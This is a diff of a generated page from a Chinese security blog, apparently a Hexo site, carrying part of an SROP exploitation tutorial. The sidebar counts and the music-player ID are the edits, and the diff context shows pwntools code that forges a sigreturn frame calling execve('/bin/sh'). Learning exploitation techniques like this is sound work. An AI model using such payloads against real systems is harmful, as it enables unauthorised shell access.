@@ -77,7 +77,7 @@
 				    
 				    <li><a href="/categories/FUZZ-AFL/" class="animsition-link">FUZZ_AFL<small>(1)</small></a></li>
 				    
-				    <li><a href="/categories/Generalization/" class="animsition-link">Generalization<small>(5)</small></a></li>
+				    <li><a href="/categories/Generalization/" class="animsition-link">Generalization<small>(6)</small></a></li>
 				    
 				    <li><a href="/categories/HEAP-ChunkOverlapping/" class="animsition-link">HEAP - ChunkOverlapping<small>(3)</small></a></li>
 				    
@@ -93,7 +93,7 @@
 				    
 				    <li><a href="/categories/HEAP-Seccomp/" class="animsition-link">HEAP - Seccomp<small>(1)</small></a></li>
 				    
-				    <li><a href="/categories/HEAP-Tcache/" class="animsition-link">HEAP - Tcache<small>(3)</small></a></li>
+				    <li><a href="/categories/HEAP-Tcache/" class="animsition-link">HEAP - Tcache<small>(2)</small></a></li>
 				    
 				    <li><a href="/categories/HEAP-Unlink/" class="animsition-link">HEAP - Unlink<small>(2)</small></a></li>
 				    
@@ -144,8 +144,6 @@
 				    <li><a href="/categories/Tcache/" class="animsition-link">Tcache<small>(2)</small></a></li>
 				    
 				    <li><a href="/categories/cve/" class="animsition-link">cve<small>(2)</small></a></li>
-				    
-				    <li><a href="/categories/mess/" class="animsition-link">mess<small>(1)</small></a></li>
 				    
 				    <li><a href="/categories/qemu/" class="animsition-link">qemu<small>(1)</small></a></li>
 				    
@@ -255,7 +253,7 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-UKZmrNNI" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
+    <div id="aplayer-hfOpThQP" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 
 <h2><span id="1前言">1)前言</span></h2><p>​        在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。</p>
 <h2><span id="2srop原理">2）SROP原理</span></h2><p>​         当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。</p>
@@ -301,7 +299,7 @@
 <p>​    接着我们开始构造<code>sys_sigreturn</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## set rax=15 and call sigreturn</span></span><br><span class="line">sigreturn = p64(syscall_ret) + <span class="string">&#x27;b&#x27;</span> * <span class="number">7</span><span class="comment">#读入15字节</span></span><br><span class="line">sh.send(sigreturn)<span class="comment">#利用与第一段payload同理。将返回地址覆盖成syscall+ret，进行系统调用，而此时rax已经被设置成15.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>​            这样我们就成功地调用了<code>sys_sigreturn</code>    ,此时我们已经可以向用户栈中读入任意数据了。</p>
+<p>​            这样我们就成功地调用了<code>sys_sigreturn</code>,此时我们已经可以向用户栈中读入任意数据了。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## call execv(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x120</span>  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + <span class="built_in">str</span>(sigframe)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(frame_payload)</span><br><span class="line">payload = frame_payload + (<span class="number">0x120</span> - <span class="built_in">len</span>(frame_payload)) * <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br></pre></td></tr></table></figure>
 
 <p>​        我们再次利用<code>SigreturnFrame()</code>来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用<code>sys_sigreturn</code>来触发。</p>
